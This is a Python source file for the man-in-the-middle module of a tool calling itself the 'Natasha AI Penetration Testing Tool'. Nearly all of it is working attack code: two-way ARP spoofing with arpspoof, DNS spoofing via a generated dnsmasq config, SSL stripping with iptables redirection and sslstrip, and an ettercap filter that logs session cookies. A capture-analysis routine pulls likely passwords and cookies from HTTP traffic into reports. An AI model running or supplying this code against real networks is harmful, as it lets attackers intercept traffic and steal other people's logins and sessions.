#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Natasha AI Penetration Testing Tool
Man-in-the-Middle Attack Module

This module implements man-in-the-middle attack capabilities for the Natasha AI
Penetration Testing Tool, including ARP spoofing, DNS spoofing, SSL stripping,
and packet capture.
"""

import os
import time
import signal
import logging
import threading
import subprocess
import json
import re
import shutil
from typing import Dict, List, Tuple, Optional, Union, Any
from enum import Enum

class MITMAttackType(Enum):
    """Enumeration of MITM attack types."""
    ARP_SPOOF = "arp_spoof"
    DNS_SPOOF = "dns_spoof"
    SSL_STRIP = "ssl_strip"
    CAPTIVE_PORTAL = "captive_portal"
    PACKET_CAPTURE = "packet_capture"
    SESSION_HIJACK = "session_hijack"

class MITMAttack:
    """Man-in-the-Middle attack module for Natasha AI Penetration Testing Tool."""
    
    def __init__(self, interface_name: str = "wlan0"):
        """Initialize the MITM attack module.
        
        Args:
            interface_name: Name of the network interface to use
        """
        self.interface_name = interface_name
        self.lock = threading.Lock()
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.attack_status = {}
        self.capture_dir = os.path.join(os.path.expanduser("~"), "natasha", "captures")
        self.analysis_dir = os.path.join(os.path.expanduser("~"), "natasha", "analysis")
        self.payload_dir = os.path.join(os.path.expanduser("~"), "natasha", "payloads")
        
        # Ensure directories exist
        os.makedirs(self.capture_dir, exist_ok=True)
        os.makedirs(self.analysis_dir, exist_ok=True)
        os.makedirs(self.payload_dir, exist_ok=True)
        
        # Load attack templates
        self.attack_templates = self._load_attack_templates()
    
    def _load_attack_templates(self) -> Dict[str, Any]:
        """Load MITM attack templates from JSON file.
        
        Returns:
            Dictionary containing attack templates
        """
        try:
            template_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'templates', 'mitm_attack.json')
            
            if os.path.exists(template_path):
                with open(template_path, 'r') as f:
                    templates = json.load(f)
                logging.info(f"Loaded {len(templates.get('attack_types', []))} MITM attack templates")
                return templates
            else:
                logging.warning(f"MITM attack template file not found: {template_path}")
                return {}
        except Exception as e:
            logging.error(f"Error loading MITM attack templates: {e}")
            return {}
    
    def check_requirements(self, attack_type: MITMAttackType) -> Tuple[bool, List[str]]:
        """Check if all required tools for an attack are installed.
        
        Args:
            attack_type: Type of MITM attack
            
        Returns:
            Tuple of (all_installed, missing_tools)
        """
        if not self.attack_templates or 'attack_types' not in self.attack_templates:
            return False, ["Attack templates not loaded"]
        
        # Find the attack template
        attack_template = None
        for template in self.attack_templates.get('attack_types', []):
            if template.get('name') == attack_type.value:
                attack_template = template
                break
        
        if not attack_template:
            return False, [f"Attack template not found for {attack_type.value}"]
        
        # Check requirements
        requirements = attack_template.get('requirements', [])
        missing_tools = []
        
        for tool in requirements:
            if shutil.which(tool) is None:
                missing_tools.append(tool)
        
        return len(missing_tools) == 0, missing_tools
    
    def start_arp_spoof(self, target_ip: str, gateway_ip: str) -> bool:
        """Start ARP spoofing attack.
        
        Args:
            target_ip: IP address of the target
            gateway_ip: IP address of the gateway
            
        Returns:
            True if attack started successfully, False otherwise
        """
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.ARP_SPOOF)
        if not requirements_met:
            logging.error(f"Missing required tools for ARP spoofing: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting ARP spoofing attack: target={target_ip}, gateway={gateway_ip}")
        
        # Enable IP forwarding
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to enable IP forwarding: {e}")
            return False
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_arp_spoof, 
                                             args=(target_ip, gateway_ip))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        self.attack_status = {
            "type": MITMAttackType.ARP_SPOOF,
            "status": "running",
            "start_time": time.time(),
            "target_ip": target_ip,
            "gateway_ip": gateway_ip
        }
        
        return True
    
    def _run_arp_spoof(self, target_ip: str, gateway_ip: str) -> None:
        """Run ARP spoofing attack in a background thread.
        
        Args:
            target_ip: IP address of the target
            gateway_ip: IP address of the gateway
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Start ARP spoofing
            cmd = ["arpspoof", "-i", self.interface_name, "-t", target_ip, gateway_ip]
            target_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Spoof in the other direction as well
            cmd = ["arpspoof", "-i", self.interface_name, "-t", gateway_ip, target_ip]
            gateway_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if processes are still running
                if target_process.poll() is not None or gateway_process.poll() is not None:
                    logging.error("ARP spoofing process terminated unexpectedly")
                    break
            
            # Terminate processes
            target_process.terminate()
            gateway_process.terminate()
            
            try:
                target_process.wait(timeout=5)
                gateway_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                target_process.kill()
                gateway_process.kill()
            
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Update status
            self.attack_status["status"] = "stopped"
            self.attack_status["end_time"] = time.time()
            
        except Exception as e:
            logging.error(f"Error during ARP spoofing attack: {e}")
            self.attack_status["status"] = "failed"
            self.attack_status["error"] = str(e)
    
    def start_dns_spoof(self, domain: str, redirect_ip: str) -> bool:
        """Start DNS spoofing attack.
        
        Args:
            domain: Domain to spoof
            redirect_ip: IP address to redirect to
            
        Returns:
            True if attack started successfully, False otherwise
        """
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.DNS_SPOOF)
        if not requirements_met:
            logging.error(f"Missing required tools for DNS spoofing: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting DNS spoofing attack: domain={domain}, redirect_ip={redirect_ip}")
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_dns_spoof, 
                                             args=(domain, redirect_ip))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        self.attack_status = {
            "type": MITMAttackType.DNS_SPOOF,
            "status": "running",
            "start_time": time.time(),
            "domain": domain,
            "redirect_ip": redirect_ip
        }
        
        return True
    
    def _run_dns_spoof(self, domain: str, redirect_ip: str) -> None:
        """Run DNS spoofing attack in a background thread.
        
        Args:
            domain: Domain to spoof
            redirect_ip: IP address to redirect to
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Create dnsmasq configuration
            config_file = os.path.join(self.capture_dir, "dnsmasq.conf")
            with open(config_file, 'w') as f:
                f.write(f"address=/{domain}/{redirect_ip}\n")
                f.write(f"interface={self.interface_name}\n")
                f.write("no-dhcp-interface=lo\n")
                f.write("no-hosts\n")
                f.write("no-resolv\n")
                f.write("log-queries\n")
                f.write(f"log-facility={os.path.join(self.capture_dir, 'dnsmasq.log')}\n")
            
            # Start dnsmasq
            cmd = ["dnsmasq", "-C", config_file, "-d"]
            dns_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if process is still running
                if dns_process.poll() is not None:
                    logging.error("DNS spoofing process terminated unexpectedly")
                    break
            
            # Terminate process
            dns_process.terminate()
            
            try:
                dns_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                dns_process.kill()
            
            # Clean up
            if os.path.exists(config_file):
                os.remove(config_file)
            
            # Update status
            self.attack_status["status"] = "stopped"
            self.attack_status["end_time"] = time.time()
            
        except Exception as e:
            logging.error(f"Error during DNS spoofing attack: {e}")
            self.attack_status["status"] = "failed"
            self.attack_status["error"] = str(e)
    
    def start_ssl_strip(self, port: int = 10000) -> bool:
        """Start SSL stripping attack.
        
        Args:
            port: Port to listen on
            
        Returns:
            True if attack started successfully, False otherwise
        """
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.SSL_STRIP)
        if not requirements_met:
            logging.error(f"Missing required tools for SSL stripping: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting SSL stripping attack on port {port}")
        
        # Enable IP forwarding
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to enable IP forwarding: {e}")
            return False
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_ssl_strip, 
                                             args=(port,))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        self.attack_status = {
            "type": MITMAttackType.SSL_STRIP,
            "status": "running",
            "start_time": time.time(),
            "port": port
        }
        
        return True
    
    def _run_ssl_strip(self, port: int) -> None:
        """Run SSL stripping attack in a background thread.
        
        Args:
            port: Port to listen on
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Set up iptables to redirect traffic
            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
                          "-j", "REDIRECT", "--to-port", str(port)], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Start sslstrip
            log_file = os.path.join(self.capture_dir, f"sslstrip_{time.strftime('%Y%m%d-%H%M%S')}.log")
            cmd = ["sslstrip", "-l", str(port), "-w", log_file]
            ssl_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if process is still running
                if ssl_process.poll() is not None:
                    logging.error("SSL stripping process terminated unexpectedly")
                    break
            
            # Terminate process
            ssl_process.terminate()
            
            try:
                ssl_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                ssl_process.kill()
            
            # Clean up iptables rules
            subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
                          "-j", "REDIRECT", "--to-port", str(port)], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Update status
            self.attack_status["status"] = "stopped"
            self.attack_status["end_time"] = time.time()
            self.attack_status["log_file"] = log_file
            
        except Exception as e:
            logging.error(f"Error during SSL stripping attack: {e}")
            self.attack_status["status"] = "failed"
            self.attack_status["error"] = str(e)
    
    def start_packet_capture(self, filter_expr: str = "", duration: int = 300) -> bool:
        """Start packet capture.
        
        Args:
            filter_expr: BPF filter expression
            duration: Duration of capture in seconds
            
        Returns:
            True if capture started successfully, False otherwise
        """
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.PACKET_CAPTURE)
        if not requirements_met:
            logging.error(f"Missing required tools for packet capture: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting packet capture: filter='{filter_expr}', duration={duration}s")
        
        # Create a thread for the capture
        self.attack_thread = threading.Thread(target=self._run_packet_capture, 
                                             args=(filter_expr, duration))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        self.attack_status = {
            "type": MITMAttackType.PACKET_CAPTURE,
            "status": "running",
            "start_time": time.time(),
            "filter": filter_expr,
            "duration": duration
        }
        
        return True
    
    def _run_packet_capture(self, filter_expr: str, duration: int) -> None:
        """Run packet capture in a background thread.
        
        Args:
            filter_expr: BPF filter expression
            duration: Duration of capture in seconds
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Create output file
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            pcap_file = os.path.join(self.capture_dir, f"capture_{timestamp}.pcap")
            
            # Build tcpdump command
            cmd = ["tcpdump", "-i", self.interface_name, "-w", pcap_file]
            if filter_expr:
                cmd.extend([filter_expr])
            
            # Start tcpdump
            capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for duration or stop event
            start_time = time.time()
            while not self.stop_event.is_set() and time.time() - start_time < duration:
                time.sleep(1)
                
                # Check if process is still running
                if capture_process.poll() is not None:
                    logging.error("Packet capture process terminated unexpectedly")
                    break
            
            # Terminate process
            capture_process.terminate()
            
            try:
                capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                capture_process.kill()
            
            # Generate summary
            summary_file = os.path.join(self.analysis_dir, f"capture_summary_{timestamp}.txt")
            
            # Use tshark to analyze the capture
            cmd = ["tshark", "-r", pcap_file, "-q", "-z", "io,stat,1", "-z", "conv,ip", 
                  "-z", "http,tree", "-z", "dns,tree"]
            
            with open(summary_file, 'w') as f:
                summary_process = subprocess.run(cmd, stdout=f, stderr=subprocess.PIPE)
            
            # Update status
            self.attack_status["status"] = "completed"
            self.attack_status["end_time"] = time.time()
            self.attack_status["pcap_file"] = pcap_file
            self.attack_status["summary_file"] = summary_file
            
        except Exception as e:
            logging.error(f"Error during packet capture: {e}")
            self.attack_status["status"] = "failed"
            self.attack_status["error"] = str(e)
    
    def start_session_hijack(self, target_ip: str) -> bool:
        """Start session hijacking attack.
        
        Args:
            target_ip: IP address of the target
            
        Returns:
            True if attack started successfully, False otherwise
        """
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.SESSION_HIJACK)
        if not requirements_met:
            logging.error(f"Missing required tools for session hijacking: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting session hijacking attack: target={target_ip}")
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_session_hijack, 
                                             args=(target_ip,))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        self.attack_status = {
            "type": MITMAttackType.SESSION_HIJACK,
            "status": "running",
            "start_time": time.time(),
            "target_ip": target_ip
        }
        
        return True
    
    def _run_session_hijack(self, target_ip: str) -> None:
        """Run session hijacking attack in a background thread.
        
        Args:
            target_ip: IP address of the target
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Create ettercap filter for cookie capture
            filter_file = os.path.join(self.payload_dir, "cookie_filter.ef")
            with open(filter_file, 'w') as f:
                f.write('if (ip.proto == TCP && tcp.dst == 80) {\n')
                f.write('  if (search(DATA.data, "Cookie")) {\n')
                f.write('    log(DATA.data, "/tmp/cookies.log");\n')
                f.write('  }\n')
                f.write('}\n')
            
            # Compile the filter
            subprocess.run(["etterfilter", filter_file, "-o", f"{filter_file}.cf"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Start ettercap
            cmd = ["ettercap", "-T", "-q", "-F", f"{filter_file}.cf", "-M", "arp", "/"+target_ip+"/", "//"]
            ettercap_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if process is still running
                if ettercap_process.poll() is not None:
                    logging.error("Session hijacking process terminated unexpectedly")
                    break
                
                # Check for captured cookies
                if os.path.exists("/tmp/cookies.log"):
                    # Copy to our capture directory
                    cookie_file = os.path.join(self.capture_dir, f"cookies_{time.strftime('%Y%m%d-%H%M%S')}.log")
                    shutil.copy("/tmp/cookies.log", cookie_file)
                    self.attack_status["cookie_file"] = cookie_file
            
            # Terminate process
            ettercap_process.terminate()
            
            try:
                ettercap_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                ettercap_process.kill()
            
            # Clean up
            if os.path.exists(filter_file):
                os.remove(filter_file)
            if os.path.exists(f"{filter_file}.cf"):
                os.remove(f"{filter_file}.cf")
            
            # Update status
            self.attack_status["status"] = "stopped"
            self.attack_status["end_time"] = time.time()
            
        except Exception as e:
            logging.error(f"Error during session hijacking attack: {e}")
            self.attack_status["status"] = "failed"
            self.attack_status["error"] = str(e)
    
    def stop_attack(self) -> None:
        """Stop the current attack."""
        logging.info("Stopping MITM attack")
        self.stop_event.set()
        
        # Wait for attack thread to finish
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        
        # Clean up based on attack type
        if self.attack_status.get("type") == MITMAttackType.ARP_SPOOF:
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        elif self.attack_status.get("type") == MITMAttackType.SSL_STRIP:
            # Clean up iptables rules
            port = self.attack_status.get("port", 10000)
            subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
                          "-j", "REDIRECT", "--to-port", str(port)], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Update status
        self.attack_status["status"] = "stopped"
        self.attack_status["end_time"] = time.time()
    
    def analyze_capture(self, pcap_file: str) -> Dict[str, Any]:
        """Analyze a packet capture file.
        
        Args:
            pcap_file: Path to the PCAP file
            
        Returns:
            Dictionary containing analysis results
        """
        if not os.path.exists(pcap_file):
            logging.error(f"PCAP file not found: {pcap_file}")
            return {"error": "PCAP file not found"}
        
        analysis = {
            "file": pcap_file,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {},
            "protocols": {},
            "hosts": {},
            "credentials": [],
            "cookies": []
        }
        
        try:
            # Get basic statistics
            cmd = ["capinfos", pcap_file]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse statistics
            for line in output.splitlines():
                if ":" in line:
                    key, value = line.split(":", 1)
                    analysis["statistics"][key.strip()] = value.strip()
            
            # Get protocol statistics
            cmd = ["tshark", "-r", pcap_file, "-q", "-z", "io,phs"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse protocol statistics
            in_protocols = False
            for line in output.splitlines():
                if "Protocol Hierarchy Statistics" in line:
                    in_protocols = True
                    continue
                if in_protocols and line.strip():
                    if "frames" in line and "bytes" in line:
                        parts = line.strip().split()
                        if len(parts) >= 5:
                            protocol = parts[0]
                            frames = parts[1]
                            bytes_val = parts[3]
                            analysis["protocols"][protocol] = {
                                "frames": frames,
                                "bytes": bytes_val
                            }
            
            # Get host statistics
            cmd = ["tshark", "-r", pcap_file, "-q", "-z", "endpoints,ip"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse host statistics
            in_hosts = False
            for line in output.splitlines():
                if "IPv4 Endpoints" in line:
                    in_hosts = True
                    continue
                if in_hosts and line.strip():
                    parts = line.strip().split()
                    if len(parts) >= 5 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                        ip = parts[0]
                        tx_frames = parts[1]
                        tx_bytes = parts[2]
                        rx_frames = parts[3]
                        rx_bytes = parts[4]
                        analysis["hosts"][ip] = {
                            "tx_frames": tx_frames,
                            "tx_bytes": tx_bytes,
                            "rx_frames": rx_frames,
                            "rx_bytes": rx_bytes
                        }
            
            # Look for credentials
            cmd = ["tshark", "-r", pcap_file, "-Y", "http.request.method == POST", "-T", "fields", 
                  "-e", "http.host", "-e", "http.request.uri", "-e", "http.file_data"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse potential credentials
            for line in output.splitlines():
                parts = line.split("\t")
                if len(parts) >= 3:
                    host = parts[0]
                    uri = parts[1]
                    data = parts[2]
                    
                    # Look for common credential patterns
                    if "user" in data.lower() or "pass" in data.lower() or "login" in data.lower() or "email" in data.lower():
                        analysis["credentials"].append({
                            "host": host,
                            "uri": uri,
                            "data": data
                        })
            
            # Look for cookies
            cmd = ["tshark", "-r", pcap_file, "-Y", "http.cookie", "-T", "fields", 
                  "-e", "http.host", "-e", "http.cookie"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse cookies
            for line in output.splitlines():
                parts = line.split("\t")
                if len(parts) >= 2:
                    host = parts[0]
                    cookie = parts[1]
                    analysis["cookies"].append({
                        "host": host,
                        "cookie": cookie
                    })
            
            return analysis
            
        except Exception as e:
            logging.error(f"Error analyzing capture: {e}")
            return {"error": str(e)}
    
    def generate_report(self, analysis: Dict[str, Any], output_format: str = "text") -> str:
        """Generate a report from analysis results.
        
        Args:
            analysis: Analysis results
            output_format: Format of the report (text, json, html)
            
        Returns:
            Report in the specified format
        """
        if "error" in analysis:
            return f"Error: {analysis['error']}"
        
        if output_format == "json":
            return json.dumps(analysis, indent=2)
        
        elif output_format == "html":
            # Generate HTML report
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>MITM Attack Analysis Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1, h2, h3 {{ color: #333; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        .warning {{ color: orange; }}
        .danger {{ color: red; }}
    </style>
</head>
<body>
    <h1>MITM Attack Analysis Report</h1>
    <p>Generated: {analysis.get('timestamp', 'Unknown')}</p>
    <p>File: {analysis.get('file', 'Unknown')}</p>
    
    <h2>Capture Statistics</h2>
    <table>
        <tr>
            <th>Statistic</th>
            <th>Value</th>
        </tr>
"""
            
            # Add statistics
            for key, value in analysis.get('statistics', {}).items():
                html += f"""
        <tr>
            <td>{key}</td>
            <td>{value}</td>
        </tr>"""
            
            html += """
    </table>
    
    <h2>Protocol Distribution</h2>
    <table>
        <tr>
            <th>Protocol</th>
            <th>Frames</th>
            <th>Bytes</th>
        </tr>
"""
            
            # Add protocols
            for protocol, stats in analysis.get('protocols', {}).items():
                html += f"""
        <tr>
            <td>{protocol}</td>
            <td>{stats.get('frames', '0')}</td>
            <td>{stats.get('bytes', '0')}</td>
        </tr>"""
            
            html += """
    </table>
    
    <h2>Host Activity</h2>
    <table>
        <tr>
            <th>IP Address</th>
            <th>TX Frames</th>
            <th>TX Bytes</th>
            <th>RX Frames</th>
            <th>RX Bytes</th>
        </tr>
"""
            
            # Add hosts
            for ip, stats in analysis.get('hosts', {}).items():
                html += f"""
        <tr>
            <td>{ip}</td>
            <td>{stats.get('tx_frames', '0')}</td>
            <td>{stats.get('tx_bytes', '0')}</td>
            <td>{stats.get('rx_frames', '0')}</td>
            <td>{stats.get('rx_bytes', '0')}</td>
        </tr>"""
            
            html += """
    </table>
"""
            
            # Add credentials if found
            if analysis.get('credentials'):
                html += """
    <h2 class="danger">Potential Credentials Found</h2>
    <table>
        <tr>
            <th>Host</th>
            <th>URI</th>
            <th>Data</th>
        </tr>
"""
                
                for cred in analysis.get('credentials', []):
                    html += f"""
        <tr>
            <td>{cred.get('host', '')}</td>
            <td>{cred.get('uri', '')}</td>
            <td>{cred.get('data', '')}</td>
        </tr>"""
                
                html += """
    </table>
"""
            
            # Add cookies if found
            if analysis.get('cookies'):
                html += """
    <h2 class="warning">Cookies Found</h2>
    <table>
        <tr>
            <th>Host</th>
            <th>Cookie</th>
        </tr>
"""
                
                for cookie in analysis.get('cookies', []):
                    html += f"""
        <tr>
            <td>{cookie.get('host', '')}</td>
            <td>{cookie.get('cookie', '')}</td>
        </tr>"""
                
                html += """
    </table>
"""
            
            html += """
</body>
</html>
"""
            return html
            
        else:  # Default to text format
            # Generate text report
            report = f"MITM Attack Analysis Report\n"
            report += f"Generated: {analysis.get('timestamp', 'Unknown')}\n"
            report += f"File: {analysis.get('file', 'Unknown')}\n\n"
            
            report += f"Capture Statistics\n"
            report += f"------------------\n"
            for key, value in analysis.get('statistics', {}).items():
                report += f"{key}: {value}\n"
            
            report += f"\nProtocol Distribution\n"
            report += f"---------------------\n"
            report += f"{'Protocol':<30} {'Frames':<10} {'Bytes':<10}\n"
            for protocol, stats in analysis.get('protocols', {}).items():
                report += f"{protocol:<30} {stats.get('frames', '0'):<10} {stats.get('bytes', '0'):<10}\n"
            
            report += f"\nHost Activity\n"
            report += f"-------------\n"
            report += f"{'IP Address':<15} {'TX Frames':<10} {'TX Bytes':<10} {'RX Frames':<10} {'RX Bytes':<10}\n"
            for ip, stats in analysis.get('hosts', {}).items():
                report += f"{ip:<15} {stats.get('tx_frames', '0'):<10} {stats.get('tx_bytes', '0'):<10} {stats.get('rx_frames', '0'):<10} {stats.get('rx_bytes', '0'):<10}\n"
            
            if analysis.get('credentials'):
                report += f"\n!!! Potential Credentials Found !!!\n"
                report += f"--------------------------------\n"
                for cred in analysis.get('credentials', []):
                    report += f"Host: {cred.get('host', '')}\n"
                    report += f"URI: {cred.get('uri', '')}\n"
                    report += f"Data: {cred.get('data', '')}\n\n"
            
            if analysis.get('cookies'):
                report += f"\nCookies Found\n"
                report += f"-------------\n"
                for cookie in analysis.get('cookies', []):
                    report += f"Host: {cookie.get('host', '')}\n"
                    report += f"Cookie: {cookie.get('cookie', '')}\n\n"
            
            return report